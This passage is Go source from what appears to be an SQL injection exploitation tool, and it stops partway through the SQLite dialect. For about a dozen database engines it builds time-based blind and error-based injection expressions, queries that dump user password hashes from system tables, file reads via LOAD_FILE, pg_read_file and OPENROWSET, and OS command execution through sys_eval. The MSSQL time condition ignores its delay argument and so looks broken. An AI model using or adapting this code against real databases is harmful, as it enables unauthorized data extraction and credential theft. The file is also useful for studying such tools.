package core

import (
	"fmt"
	"strings"
)

// TableRef identifies one table independent from the DBMS naming rules.
// MySQL uses DB and ignores Schema, PostgreSQL uses Schema inside the current
// database, MSSQL uses both, Oracle uses DB as the owner.
type TableRef struct {
	DB     string
	Schema string
	Table  string
}

// Name renders the human readable identifier used in results and logs.
func (r TableRef) Name() string {
	parts := make([]string, 0, 3)
	if r.DB != "" {
		parts = append(parts, r.DB)
	}
	if r.Schema != "" && !strings.EqualFold(r.Schema, r.DB) {
		parts = append(parts, r.Schema)
	}
	parts = append(parts, r.Table)
	return strings.Join(parts, ".")
}

// Target returns the database.schema value used by metadata listing helpers.
func (r TableRef) Target() string {
	if r.Schema != "" && !strings.EqualFold(r.Schema, r.DB) {
		return r.DB + "." + r.Schema
	}
	return r.DB
}

// Dialect contains the SQL syntax differences that matter for enumeration
// and extraction. Every function returns a scalar SQL expression unless the
// parameter or result says otherwise.
type Dialect struct {
	Name    string
	Aliases []string

	Quote  func(string) string
	Str    func(string) string
	Concat func(...string) string

	Length func(string) string
	Substr func(string, int, int) string
	ASCII  func(string) string
	Marker func(string) string

	SleepExpr     func(int) string
	TimeCondition func(string, int) string
	ErrorExpr     func(string) (string, bool)

	// Metadata enumeration.
	Databases func() string
	Schemas   func(db string) string
	Tables    func(db, schema string) string
	Columns   func(db, schema, table string) string

	CurrentDB  func() string
	Version    func() string
	User       func() string
	Hostname   func() string
	IsDBA      func() string
	Privileges func() string
	Users      func() string
	Passwords  func() string
	Roles      func() string

	// Table access.
	RowCount      func(ref TableRef, where string) string
	DumpRow       func(ref TableRef, cols []string, offset int, where string) string
	FileRead      func(string) (string, bool)
	OSCmd         func(string) (string, bool)
	SearchTables  func(string) string
	SearchColumns func(string) string
	TableColumns  func(db, schema, table string) string
	AllTables     func() string
	AllColumns    func() string
}

func quoteBacktick(s string) string {
	return "`" + strings.ReplaceAll(s, "`", "``") + "`"
}

func quoteDouble(s string) string {
	return `"` + strings.ReplaceAll(s, `"`, `""`) + `"`
}

func quoteBracket(s string) string {
	return "[" + strings.ReplaceAll(s, "]", "]]") + "]"
}

func literal(s string) string {
	return "'" + strings.ReplaceAll(s, "'", "''") + "'"
}

func mysqlLiteral(s string) string {
	s = strings.ReplaceAll(s, `\`, `\\`)
	s = strings.ReplaceAll(s, "'", "''")
	return "'" + s + "'"
}

func concatFunc(name string) func(...string) string {
	return func(parts ...string) string {
		if len(parts) == 0 {
			return "''"
		}
		if len(parts) == 1 {
			return parts[0]
		}
		return fmt.Sprintf("%s(%s)", name, strings.Join(parts, ","))
	}
}

func concatPipe(parts ...string) string {
	if len(parts) == 0 {
		return "''"
	}
	if len(parts) == 1 {
		return parts[0]
	}
	return "(" + strings.Join(parts, "||") + ")"
}

// concatPlus exists for Sybase ASE, whose string concatenation operator is +.
func concatPlus(parts ...string) string {
	if len(parts) == 0 {
		return "''"
	}
	if len(parts) == 1 {
		return parts[0]
	}
	return "(" + strings.Join(parts, "+") + ")"
}

func markerPipe(expr string) string {
	return "('~'||" + expr + "||'~')"
}

func markerFunc(expr string) string {
	return "CONCAT('~'," + expr + ",'~')"
}

func defaultAliases(name string, aliases ...string) []string {
	return append([]string{name}, aliases...)
}

// whereClause normalizes a user supplied WHERE fragment. A trailing semicolon
// is removed so the fragment cannot terminate the scalar subquery.
func whereClause(where string) string {
	where = strings.TrimSpace(where)
	if where == "" {
		return ""
	}
	lower := strings.ToLower(where)
	if strings.HasPrefix(lower, "where ") {
		where = strings.TrimSpace(where[len("where "):])
	}
	where = strings.TrimSpace(strings.TrimRight(where, ";"))
	if where == "" {
		return ""
	}
	return " WHERE " + where
}

// interleave joins expressions with a separator expression, producing the
// argument list used by CONCAT style functions.
func interleave(parts []string, sep string) []string {
	if len(parts) == 0 {
		return nil
	}
	out := make([]string, 0, len(parts)*2-1)
	for i, part := range parts {
		if i > 0 {
			out = append(out, sep)
		}
		out = append(out, part)
	}
	return out
}

func joinExpr(parts []string, sep string, pipe bool) string {
	if len(parts) == 0 {
		return "''"
	}
	if len(parts) == 1 {
		return parts[0]
	}
	if pipe {
		return "(" + strings.Join(interleave(parts, sep), "||") + ")"
	}
	return "CONCAT(" + strings.Join(interleave(parts, sep), ",") + ")"
}

// Dialects returns every supported dialect in fingerprint order. The order
// puts the most common engines first so a confirmed target leaves the
// fingerprint loop early.
func Dialects() []*Dialect {
	return []*Dialect{
		mysqlDialect(),
		postgresDialect(),
		mssqlDialect(),
		oracleDialect(),
		sqliteDialect(),
		db2Dialect(),
		clickhouseDialect(),
		duckdbDialect(),
		cockroachDialect(),
		snowflakeDialect(),
		bigqueryDialect(),
		firebirdDialect(),
		sybaseDialect(),
		h2Dialect(),
	}
}

func GetDialect(name string) *Dialect {
	name = strings.TrimSpace(name)
	if name == "" || strings.EqualFold(name, "auto") || strings.EqualFold(name, "unknown") {
		return nil
	}
	for _, d := range Dialects() {
		if strings.EqualFold(d.Name, name) {
			return d
		}
		for _, a := range d.Aliases {
			if strings.EqualFold(a, name) {
				return d
			}
		}
	}
	return nil
}

// --- qualification helpers ------------------------------------------------

func mysqlTable(ref TableRef) string {
	db := ref.DB
	if ref.Schema != "" {
		db = ref.Schema
	}
	if db == "" {
		return quoteBacktick(ref.Table)
	}
	return quoteBacktick(db) + "." + quoteBacktick(ref.Table)
}

func pgTable(ref TableRef) string {
	if ref.Schema == "" {
		return quoteDouble(ref.Table)
	}
	return quoteDouble(ref.Schema) + "." + quoteDouble(ref.Table)
}

func mssqlTable(ref TableRef) string {
	schema := ref.Schema
	if schema == "" {
		schema = "dbo"
	}
	if ref.DB == "" {
		return quoteBracket(schema) + "." + quoteBracket(ref.Table)
	}
	return quoteBracket(ref.DB) + "." + quoteBracket(schema) + "." + quoteBracket(ref.Table)
}

func oracleTable(ref TableRef) string {
	owner := ref.DB
	if owner == "" {
		owner = ref.Schema
	}
	if owner == "" {
		return quoteDouble(strings.ToUpper(ref.Table))
	}
	return quoteDouble(strings.ToUpper(owner)) + "." + quoteDouble(strings.ToUpper(ref.Table))
}

func snowflakeTable(ref TableRef) string {
	schema := ref.Schema
	if schema == "" {
		schema = "PUBLIC"
	}
	if ref.DB == "" {
		return quoteDouble(schema) + "." + quoteDouble(ref.Table)
	}
	return quoteDouble(ref.DB) + "." + quoteDouble(schema) + "." + quoteDouble(ref.Table)
}

func clickhouseTable(ref TableRef) string {
	if ref.DB == "" {
		return quoteBacktick(ref.Table)
	}
	return quoteBacktick(ref.DB) + "." + quoteBacktick(ref.Table)
}

func bigqueryTable(ref TableRef) string {
	if ref.DB == "" {
		return quoteBacktick(ref.Table)
	}
	if ref.Schema != "" {
		return quoteBacktick(ref.DB) + "." + quoteBacktick(ref.Schema) + "." + quoteBacktick(ref.Table)
	}
	return quoteBacktick(ref.DB) + "." + quoteBacktick(ref.Table)
}

func h2Table(ref TableRef) string {
	schema := ref.Schema
	if schema == "" {
		schema = "PUBLIC"
	}
	return quoteDouble(schema) + "." + quoteDouble(ref.Table)
}

func firebirdTable(ref TableRef) string {
	return quoteDouble(strings.ToUpper(ref.Table))
}

func sybaseTable(ref TableRef) string {
	if ref.DB == "" {
		return quoteBracket(ref.Table)
	}
	return quoteBracket(ref.DB) + ".." + quoteBracket(ref.Table)
}

func db2Table(ref TableRef) string {
	schema := ref.Schema
	if schema == "" {
		return quoteDouble(ref.Table)
	}
	return quoteDouble(schema) + "." + quoteDouble(ref.Table)
}

func duckdbTable(ref TableRef) string {
	if ref.Schema == "" {
		return quoteDouble(ref.Table)
	}
	return quoteDouble(ref.Schema) + "." + quoteDouble(ref.Table)
}

func defaultSchemaFor(dbms string) string {
	switch strings.ToLower(dbms) {
	case "postgresql", "cockroachdb", "duckdb":
		return "public"
	case "mssql", "sybase":
		return "dbo"
	case "snowflake", "h2":
		return "PUBLIC"
	}
	return ""
}

// --- MySQL / MariaDB -----------------------------------------------------

func mysqlDialect() *Dialect {
	return &Dialect{
		Name:    "MySQL",
		Aliases: defaultAliases("MySQL", "MariaDB", "Percona", "TiDB", "Vitess", "Aurora MySQL"),
		Quote:   quoteBacktick,
		Str:     mysqlLiteral,
		Concat:  concatFunc("CONCAT"),
		Length:  func(e string) string { return "LENGTH(" + e + ")" },
		Substr:  func(e string, p, l int) string { return fmt.Sprintf("SUBSTRING(%s,%d,%d)", e, p, l) },
		ASCII:   func(e string) string { return "ASCII(" + e + ")" },
		Marker:  markerFunc,
		SleepExpr: func(n int) string {
			return fmt.Sprintf("SLEEP(%d)", n)
		},
		TimeCondition: func(cond string, n int) string {
			return fmt.Sprintf("CASE WHEN (%s) THEN SLEEP(%d) ELSE 0 END", cond, n)
		},
		ErrorExpr: func(expr string) (string, bool) {
			return fmt.Sprintf("EXTRACTVALUE(1,CONCAT(0x7e,(%s),0x7e))", expr), true
		},
		Databases: func() string {
			return "(SELECT GROUP_CONCAT(schema_name SEPARATOR 0x1e) FROM `information_schema`.`schemata`)"
		},
		Schemas: func(db string) string { return "" },
		Tables: func(db, schema string) string {
			if schema != "" {
				db = schema
			}
			if db == "" {
				return "(SELECT GROUP_CONCAT(table_name SEPARATOR 0x1e) FROM `information_schema`.`tables` WHERE table_schema=DATABASE())"
			}
			return fmt.Sprintf("(SELECT GROUP_CONCAT(table_name SEPARATOR 0x1e) FROM `information_schema`.`tables` WHERE table_schema=%s)", literal(db))
		},
		Columns: func(db, schema, table string) string {
			if schema != "" {
				db = schema
			}
			if db == "" {
				return fmt.Sprintf("(SELECT GROUP_CONCAT(column_name SEPARATOR 0x1e) FROM `information_schema`.`columns` WHERE table_schema=DATABASE() AND table_name=%s ORDER BY ordinal_position)", literal(table))
			}
			return fmt.Sprintf("(SELECT GROUP_CONCAT(column_name SEPARATOR 0x1e) FROM `information_schema`.`columns` WHERE table_schema=%s AND table_name=%s ORDER BY ordinal_position)", literal(db), literal(table))
		},
		CurrentDB: func() string { return "DATABASE()" },
		Version:   func() string { return "@@VERSION" },
		User:      func() string { return "USER()" },
		Hostname:  func() string { return "@@hostname" },
		IsDBA: func() string {
			return "(SELECT COUNT(*) FROM `information_schema`.`user_privileges` WHERE GRANTEE=CONCAT('''',SUBSTRING_INDEX(USER(),'@',1),'''@''%''') AND PRIVILEGE_TYPE='SUPER')"
		},
		Privileges: func() string {
			return "(SELECT GROUP_CONCAT(CONCAT(GRANTEE,':',PRIVILEGE_TYPE) SEPARATOR 0x1e) FROM `information_schema`.`user_privileges`)"
		},
		Users: func() string {
			return "(SELECT GROUP_CONCAT(CONCAT(user,'@',host) SEPARATOR 0x1e) FROM mysql.user)"
		},
		Passwords: func() string {
			return "(SELECT GROUP_CONCAT(CONCAT(user,'@',host,':',authentication_string) SEPARATOR 0x1e) FROM mysql.user)"
		},
		Roles: func() string {
			return "(SELECT GROUP_CONCAT(CONCAT(USER,'@',HOST) SEPARATOR 0x1e) FROM mysql.user)"
		},
		RowCount: func(ref TableRef, where string) string {
			return fmt.Sprintf("(SELECT COUNT(*) FROM %s%s)", mysqlTable(ref), whereClause(where))
		},
		DumpRow: func(ref TableRef, cols []string, offset int, where string) string {
			parts := make([]string, 0, len(cols))
			for _, c := range cols {
				parts = append(parts, fmt.Sprintf("IFNULL(CAST(%s AS CHAR),'NULL')", quoteBacktick(c)))
			}
			return fmt.Sprintf("(SELECT %s FROM %s%s LIMIT %d,1)", joinExpr(parts, "0x1f", false), mysqlTable(ref), whereClause(where), offset)
		},
		FileRead: func(path string) (string, bool) {
			return fmt.Sprintf("LOAD_FILE(%s)", mysqlLiteral(path)), true
		},
		OSCmd: func(cmd string) (string, bool) {
			return fmt.Sprintf("(SELECT sys_eval(%s))", mysqlLiteral(cmd)), true
		},
		SearchTables: func(keyword string) string {
			return fmt.Sprintf("(SELECT GROUP_CONCAT(CONCAT(table_schema,'.',table_name) SEPARATOR 0x1e) FROM `information_schema`.`tables` WHERE table_name LIKE %s)", literal("%"+keyword+"%"))
		},
		SearchColumns: func(keyword string) string {
			return fmt.Sprintf("(SELECT GROUP_CONCAT(CONCAT(table_schema,'.',table_name,'.',column_name) SEPARATOR 0x1e) FROM `information_schema`.`columns` WHERE column_name LIKE %s)", literal("%"+keyword+"%"))
		},
		TableColumns: func(db, schema, table string) string {
			if schema != "" {
				db = schema
			}
			if db == "" {
				return fmt.Sprintf("(SELECT GROUP_CONCAT(CONCAT(column_name,':',column_type) SEPARATOR 0x1e) FROM `information_schema`.`columns` WHERE table_schema=DATABASE() AND table_name=%s ORDER BY ordinal_position)", literal(table))
			}
			return fmt.Sprintf("(SELECT GROUP_CONCAT(CONCAT(column_name,':',column_type) SEPARATOR 0x1e) FROM `information_schema`.`columns` WHERE table_schema=%s AND table_name=%s ORDER BY ordinal_position)", literal(db), literal(table))
		},
		AllTables: func() string {
			return "(SELECT GROUP_CONCAT(CONCAT(table_schema,'.',table_name) SEPARATOR 0x1e) FROM `information_schema`.`tables` WHERE table_schema NOT IN ('information_schema','performance_schema','mysql','sys'))"
		},
		AllColumns: func() string {
			return "(SELECT GROUP_CONCAT(CONCAT(table_schema,'.',table_name,'.',column_name) SEPARATOR 0x1e) FROM `information_schema`.`columns` WHERE table_schema NOT IN ('information_schema','performance_schema','mysql','sys'))"
		},
	}
}

// --- PostgreSQL ----------------------------------------------------------

func postgresDialect() *Dialect {
	return &Dialect{
		Name: "PostgreSQL",
		Aliases: defaultAliases("PostgreSQL", "Postgres", "Redshift", "Greenplum",
			"YugabyteDB", "TimescaleDB", "Aurora PostgreSQL", "Neon", "Supabase"),
		Quote:  quoteDouble,
		Str:    literal,
		Concat: concatPipe,
		Length: func(e string) string { return "LENGTH(" + e + ")" },
		Substr: func(e string, p, l int) string { return fmt.Sprintf("SUBSTRING(%s FROM %d FOR %d)", e, p, l) },
		ASCII:  func(e string) string { return "ASCII(" + e + ")" },
		Marker: markerPipe,
		SleepExpr: func(n int) string {
			return fmt.Sprintf("pg_sleep(%d)", n)
		},
		TimeCondition: func(cond string, n int) string {
			return fmt.Sprintf("CASE WHEN (%s) THEN (SELECT 1 FROM pg_sleep(%d)) ELSE 1 END", cond, n)
		},
		ErrorExpr: func(expr string) (string, bool) {
			return fmt.Sprintf("1=CAST(CONCAT('~',(%s),'~') AS INT)", expr), true
		},
		Databases: func() string {
			return "(SELECT string_agg(datname,chr(30)) FROM pg_database WHERE datistemplate=false)"
		},
		Schemas: func(db string) string {
			if db == "" {
				return "(SELECT string_agg(schema_name,chr(30)) FROM information_schema.schemata WHERE schema_name NOT IN ('pg_catalog','information_schema'))"
			}
			return fmt.Sprintf("(SELECT string_agg(schema_name,chr(30)) FROM information_schema.schemata WHERE catalog_name=%s AND schema_name NOT IN ('pg_catalog','information_schema'))", literal(db))
		},
		Tables: func(db, schema string) string {
			schema = strings.TrimSpace(schema)
			if schema == "" {
				schema = "public"
			}
			if db == "" {
				return fmt.Sprintf("(SELECT string_agg(table_name,chr(30)) FROM information_schema.tables WHERE table_schema=%s AND table_type='BASE TABLE')", literal(schema))
			}
			return fmt.Sprintf("(SELECT string_agg(table_name,chr(30)) FROM information_schema.tables WHERE table_catalog=%s AND table_schema=%s AND table_type='BASE TABLE')", literal(db), literal(schema))
		},
		Columns: func(db, schema, table string) string {
			schema = strings.TrimSpace(schema)
			if schema == "" {
				schema = "public"
			}
			return fmt.Sprintf("(SELECT string_agg(column_name,chr(30)) FROM information_schema.columns WHERE table_schema=%s AND table_name=%s)", literal(schema), literal(table))
		},
		CurrentDB: func() string { return "current_database()" },
		Version:   func() string { return "version()" },
		User:      func() string { return "current_user" },
		Hostname:  func() string { return "COALESCE(inet_server_addr()::text,'localhost')" },
		IsDBA: func() string {
			return "(SELECT CASE WHEN usesuper THEN 1 ELSE 0 END FROM pg_user WHERE usename=current_user)"
		},
		Privileges: func() string {
			return "(SELECT string_agg(privilege_type,chr(30)) FROM information_schema.role_table_grants WHERE grantee=current_user)"
		},
		Users: func() string {
			return "(SELECT string_agg(usename,chr(30)) FROM pg_user)"
		},
		Passwords: func() string {
			return "(SELECT string_agg(usename||':'||passwd,chr(30)) FROM pg_shadow)"
		},
		Roles: func() string {
			return "(SELECT string_agg(rolname,chr(30)) FROM pg_roles)"
		},
		RowCount: func(ref TableRef, where string) string {
			return fmt.Sprintf("(SELECT COUNT(*) FROM %s%s)", pgTable(ref), whereClause(where))
		},
		DumpRow: func(ref TableRef, cols []string, offset int, where string) string {
			parts := make([]string, 0, len(cols))
			for _, c := range cols {
				parts = append(parts, fmt.Sprintf("COALESCE(%s::text,'NULL')", quoteDouble(c)))
			}
			return fmt.Sprintf("(SELECT %s FROM %s%s LIMIT 1 OFFSET %d)", joinExpr(parts, "chr(31)", true), pgTable(ref), whereClause(where), offset)
		},
		FileRead: func(path string) (string, bool) {
			return fmt.Sprintf("pg_read_file(%s)", literal(path)), true
		},
		OSCmd: func(cmd string) (string, bool) {
			return "", false
		},
		SearchTables: func(keyword string) string {
			return fmt.Sprintf("(SELECT string_agg(table_schema||'.'||table_name,chr(30)) FROM information_schema.tables WHERE table_name LIKE %s)", literal("%"+keyword+"%"))
		},
		SearchColumns: func(keyword string) string {
			return fmt.Sprintf("(SELECT string_agg(table_schema||'.'||table_name||'.'||column_name,chr(30)) FROM information_schema.columns WHERE column_name LIKE %s)", literal("%"+keyword+"%"))
		},
		TableColumns: func(db, schema, table string) string {
			schema = strings.TrimSpace(schema)
			if schema == "" {
				schema = "public"
			}
			return fmt.Sprintf("(SELECT string_agg(column_name||':'||data_type,chr(30)) FROM information_schema.columns WHERE table_schema=%s AND table_name=%s)", literal(schema), literal(table))
		},
		AllTables: func() string {
			return "(SELECT string_agg(table_schema||'.'||table_name,chr(30)) FROM information_schema.tables WHERE table_schema NOT IN ('pg_catalog','information_schema'))"
		},
		AllColumns: func() string {
			return "(SELECT string_agg(table_schema||'.'||table_name||'.'||column_name,chr(30)) FROM information_schema.columns WHERE table_schema NOT IN ('pg_catalog','information_schema'))"
		},
	}
}

// --- Microsoft SQL Server ------------------------------------------------

func mssqlDialect() *Dialect {
	return &Dialect{
		Name:    "MSSQL",
		Aliases: defaultAliases("MSSQL", "SQLServer", "SQL Server", "Azure SQL", "AzureSQL"),
		Quote:   quoteBracket,
		Str:     literal,
		Concat:  concatFunc("CONCAT"),
		Length:  func(e string) string { return "LEN(" + e + ")" },
		Substr:  func(e string, p, l int) string { return fmt.Sprintf("SUBSTRING(%s,%d,%d)", e, p, l) },
		ASCII:   func(e string) string { return "ASCII(" + e + ")" },
		Marker:  markerFunc,
		SleepExpr: func(n int) string {
			return fmt.Sprintf("WAITFOR DELAY '0:0:%d'", n)
		},
		TimeCondition: func(cond string, n int) string {
			return fmt.Sprintf("CASE WHEN (%s) THEN 1 ELSE 1 END", cond)
		},
		ErrorExpr: func(expr string) (string, bool) {
			return fmt.Sprintf("1=CONVERT(INT,CONCAT('~',(%s),'~'))", expr), true
		},
		Databases: func() string {
			return "(SELECT STRING_AGG(name,CHAR(30)) FROM sys.databases)"
		},
		Schemas: func(db string) string {
			if db == "" {
				db = "DB_NAME()"
			} else {
				db = quoteBracket(db)
			}
			return fmt.Sprintf("(SELECT STRING_AGG(name,CHAR(30)) FROM %s.sys.schemas WHERE name NOT IN ('sys','INFORMATION_SCHEMA','guest'))", db)
		},
		Tables: func(db, schema string) string {
			schema = strings.TrimSpace(schema)
			if schema == "" {
				schema = "dbo"
			}
			if db == "" {
				db = "DB_NAME()"
			} else {
				db = quoteBracket(db)
			}
			return fmt.Sprintf("(SELECT STRING_AGG(t.name,CHAR(30)) FROM %s.sys.tables t JOIN %s.sys.schemas s ON t.schema_id=s.schema_id WHERE s.name=%s)", db, db, literal(schema))
		},
		Columns: func(db, schema, table string) string {
			schema = strings.TrimSpace(schema)
			if schema == "" {
				schema = "dbo"
			}
			if db == "" {
				db = "DB_NAME()"
			} else {
				db = quoteBracket(db)
			}
			return fmt.Sprintf("(SELECT STRING_AGG(c.name,CHAR(30)) FROM %s.sys.columns c JOIN %s.sys.tables t ON c.object_id=t.object_id JOIN %s.sys.schemas s ON t.schema_id=s.schema_id WHERE t.name=%s AND s.name=%s)", db, db, db, literal(table), literal(schema))
		},
		CurrentDB: func() string { return "DB_NAME()" },
		Version:   func() string { return "@@VERSION" },
		User:      func() string { return "SYSTEM_USER" },
		Hostname:  func() string { return "@@SERVERNAME" },
		IsDBA:     func() string { return "IS_SRVROLEMEMBER('sysadmin')" },
		Privileges: func() string {
			return "(SELECT STRING_AGG(permission_name,CHAR(30)) FROM fn_my_permissions(NULL,'SERVER'))"
		},
		Users: func() string {
			return "(SELECT STRING_AGG(name,CHAR(30)) FROM sys.server_principals WHERE type IN ('S','U'))"
		},
		Passwords: func() string {
			return "(SELECT STRING_AGG(name+':'+password_hash,CHAR(30)) FROM sys.sql_logins)"
		},
		Roles: func() string {
			return "(SELECT STRING_AGG(name,CHAR(30)) FROM sys.server_principals WHERE type='R')"
		},
		RowCount: func(ref TableRef, where string) string {
			return fmt.Sprintf("(SELECT COUNT(*) FROM %s%s)", mssqlTable(ref), whereClause(where))
		},
		DumpRow: func(ref TableRef, cols []string, offset int, where string) string {
			parts := make([]string, 0, len(cols))
			for _, c := range cols {
				parts = append(parts, fmt.Sprintf("ISNULL(CAST(%s AS NVARCHAR(MAX)),'NULL')", quoteBracket(c)))
			}
			return fmt.Sprintf("(SELECT %s FROM %s%s ORDER BY (SELECT NULL) OFFSET %d ROWS FETCH NEXT 1 ROWS ONLY)", joinExpr(parts, "CHAR(31)", false), mssqlTable(ref), whereClause(where), offset)
		},
		FileRead: func(path string) (string, bool) {
			return fmt.Sprintf("(SELECT BulkColumn FROM OPENROWSET(BULK %s,SINGLE_CLOB) AS x)", literal(path)), true
		},
		OSCmd: func(cmd string) (string, bool) {
			return "", false
		},
		SearchTables: func(keyword string) string {
			return fmt.Sprintf("(SELECT STRING_AGG(name,CHAR(30)) FROM sys.tables WHERE name LIKE %s)", literal("%"+keyword+"%"))
		},
		SearchColumns: func(keyword string) string {
			return fmt.Sprintf("(SELECT STRING_AGG(name,CHAR(30)) FROM sys.columns WHERE name LIKE %s)", literal("%"+keyword+"%"))
		},
		TableColumns: func(db, schema, table string) string {
			schema = strings.TrimSpace(schema)
			if schema == "" {
				schema = "dbo"
			}
			if db == "" {
				db = "DB_NAME()"
			} else {
				db = quoteBracket(db)
			}
			return fmt.Sprintf("(SELECT STRING_AGG(c.name+':'+t.name,CHAR(30)) FROM %s.sys.columns c JOIN %s.sys.types t ON c.user_type_id=t.user_type_id JOIN %s.sys.tables tb ON c.object_id=tb.object_id JOIN %s.sys.schemas s ON tb.schema_id=s.schema_id WHERE tb.name=%s AND s.name=%s)", db, db, db, db, literal(table), literal(schema))
		},
		AllTables: func() string {
			return "(SELECT STRING_AGG(name,CHAR(30)) FROM sys.tables)"
		},
		AllColumns: func() string {
			return "(SELECT STRING_AGG(name,CHAR(30)) FROM sys.columns)"
		},
	}
}

// --- Oracle --------------------------------------------------------------

func oracleDialect() *Dialect {
	return &Dialect{
		Name:    "Oracle",
		Aliases: defaultAliases("Oracle", "OracleDB", "Oracle Database"),
		Quote:   quoteDouble,
		Str:     literal,
		Concat:  concatPipe,
		Length:  func(e string) string { return "LENGTH(" + e + ")" },
		Substr:  func(e string, p, l int) string { return fmt.Sprintf("SUBSTR(%s,%d,%d)", e, p, l) },
		ASCII:   func(e string) string { return "ASCII(" + e + ")" },
		Marker:  markerPipe,
		SleepExpr: func(n int) string {
			return fmt.Sprintf("dbms_pipe.receive_message(('a'),%d)", n)
		},
		TimeCondition: func(cond string, n int) string {
			return fmt.Sprintf("CASE WHEN (%s) THEN dbms_pipe.receive_message(('a'),%d) ELSE 1 END", cond, n)
		},
		ErrorExpr: func(expr string) (string, bool) {
			return fmt.Sprintf("1=UTL_INADDR.GET_HOST_NAME((%s))", expr), true
		},
		Databases: func() string {
			return "(SELECT LISTAGG(username,CHR(30)) WITHIN GROUP (ORDER BY username) FROM all_users)"
		},
		Schemas: func(db string) string { return "" },
		Tables: func(db, schema string) string {
			owner := db
			if owner == "" {
				owner = schema
			}
			if owner == "" {
				return "(SELECT LISTAGG(table_name,CHR(30)) WITHIN GROUP (ORDER BY table_name) FROM all_tables WHERE owner=USER)"
			}
			return fmt.Sprintf("(SELECT LISTAGG(table_name,CHR(30)) WITHIN GROUP (ORDER BY table_name) FROM all_tables WHERE owner=%s)", literal(strings.ToUpper(owner)))
		},
		Columns: func(db, schema, table string) string {
			owner := db
			if owner == "" {
				owner = schema
			}
			if owner == "" {
				return fmt.Sprintf("(SELECT LISTAGG(column_name,CHR(30)) WITHIN GROUP (ORDER BY column_id) FROM all_tab_columns WHERE owner=USER AND table_name=%s)", literal(strings.ToUpper(table)))
			}
			return fmt.Sprintf("(SELECT LISTAGG(column_name,CHR(30)) WITHIN GROUP (ORDER BY column_id) FROM all_tab_columns WHERE owner=%s AND table_name=%s)", literal(strings.ToUpper(owner)), literal(strings.ToUpper(table)))
		},
		CurrentDB: func() string { return "SYS_CONTEXT('USERENV','CURRENT_SCHEMA')" },
		Version:   func() string { return "(SELECT banner FROM v$version WHERE ROWNUM=1)" },
		User:      func() string { return "USER" },
		Hostname:  func() string { return "SYS_CONTEXT('USERENV','SERVER_HOST')" },
		IsDBA: func() string {
			return "(SELECT CASE WHEN COUNT(*)>0 THEN 1 ELSE 0 END FROM user_role_privs WHERE granted_role='DBA')"
		},
		Privileges: func() string {
			return "(SELECT LISTAGG(privilege,CHR(30)) WITHIN GROUP (ORDER BY privilege) FROM user_sys_privs)"
		},
		Users: func() string {
			return "(SELECT LISTAGG(username,CHR(30)) WITHIN GROUP (ORDER BY username) FROM all_users)"
		},
		Passwords: func() string {
			return "(SELECT LISTAGG(name||':'||password,CHR(30)) WITHIN GROUP (ORDER BY name) FROM sys.user$)"
		},
		Roles: func() string {
			return "(SELECT LISTAGG(granted_role,CHR(30)) WITHIN GROUP (ORDER BY granted_role) FROM user_role_privs)"
		},
		RowCount: func(ref TableRef, where string) string {
			return fmt.Sprintf("(SELECT COUNT(*) FROM %s%s)", oracleTable(ref), whereClause(where))
		},
		DumpRow: func(ref TableRef, cols []string, offset int, where string) string {
			parts := make([]string, 0, len(cols))
			for _, c := range cols {
				parts = append(parts, fmt.Sprintf("NVL(TO_CHAR(%s),'NULL')", quoteDouble(strings.ToUpper(c))))
			}
			return fmt.Sprintf("(SELECT %s FROM %s%s OFFSET %d ROWS FETCH NEXT 1 ROWS ONLY)", joinExpr(parts, "CHR(31)", true), oracleTable(ref), whereClause(where), offset)
		},
		FileRead: func(path string) (string, bool) {
			return "", false
		},
		OSCmd: func(cmd string) (string, bool) {
			return "", false
		},
		SearchTables: func(keyword string) string {
			return fmt.Sprintf("(SELECT LISTAGG(table_name,CHR(30)) WITHIN GROUP (ORDER BY table_name) FROM all_tables WHERE table_name LIKE %s)", literal("%"+strings.ToUpper(keyword)+"%"))
		},
		SearchColumns: func(keyword string) string {
			return fmt.Sprintf("(SELECT LISTAGG(table_name||'.'||column_name,CHR(30)) WITHIN GROUP (ORDER BY table_name,column_name) FROM all_tab_columns WHERE column_name LIKE %s)", literal("%"+strings.ToUpper(keyword)+"%"))
		},
		TableColumns: func(db, schema, table string) string {
			owner := db
			if owner == "" {
				owner = schema
			}
			if owner == "" {
				return fmt.Sprintf("(SELECT LISTAGG(column_name||':'||data_type,CHR(30)) WITHIN GROUP (ORDER BY column_id) FROM all_tab_columns WHERE owner=USER AND table_name=%s)", literal(strings.ToUpper(table)))
			}
			return fmt.Sprintf("(SELECT LISTAGG(column_name||':'||data_type,CHR(30)) WITHIN GROUP (ORDER BY column_id) FROM all_tab_columns WHERE owner=%s AND table_name=%s)", literal(strings.ToUpper(owner)), literal(strings.ToUpper(table)))
		},
		AllTables: func() string {
			return "(SELECT LISTAGG(owner||'.'||table_name,CHR(30)) WITHIN GROUP (ORDER BY owner,table_name) FROM all_tables WHERE owner NOT IN ('SYS','SYSTEM'))"
		},
		AllColumns: func() string {
			return "(SELECT LISTAGG(owner||'.'||table_name||'.'||column_name,CHR(30)) WITHIN GROUP (ORDER BY owner,table_name,column_name) FROM all_tab_columns WHERE owner NOT IN ('SYS','SYSTEM'))"
		},
	}
}

// --- SQLite --------------------------------------------------------------

// sqliteSleep burns CPU in a recursive CTE because SQLite has no sleep
// function. One million rows take roughly 0.7 seconds on a typical machine,
// so the row count is scaled to the requested delay in seconds.
func sqliteSleep(n int) string {
	if n < 1 {
		n = 1
	}
	rows := n * 1500000
	return fmt.Sprintf("(WITH RECURSIVE hackit_sleep(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM hackit_sleep WHERE x<%d) SELECT count(*) FROM hackit_sleep)", rows)
}

func sqliteDialect() *Dialect {
	return &Dialect{
		Name:    "SQLite",
		Aliases: defaultAliases("SQLite", "SQLite3"),
		Quote:   quoteDouble,
		Str:     literal,
		Concat:  concatPipe,
		Length:  func(e string) string { return "LENGTH(" + e + ")" },
		Substr:  func(e string, p, l int) string { return fmt.Sprintf("SUBSTR(%s,%d,%d)", e, p, l) },
		ASCII:   func(e string) string { return "UNICODE(" + e + ")" },
		Marker:  markerPipe,
		SleepExpr: func(n int) string {
			return sqliteSleep(n)
		},
		TimeCondition: func(cond string, n int) string {
			return fmt.Sprintf("CASE WHEN (%s) THEN %s ELSE 1 END", cond, sqliteSleep(n))
		},
		ErrorExpr: func(expr string) (string, bool) {
			return "", false
		},
		Databases: func() string {
			return "(SELECT GROUP_CONCAT(name,char(30)) FROM pragma_database_list)"
		},
		Schemas: func(db string) string { return "" },
		Tables: func(db, schema string) string {
			return "(SELECT GROUP_CONCAT(name,char(30)) FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%')"
		},
		Columns: func(db, schema, table string) string {
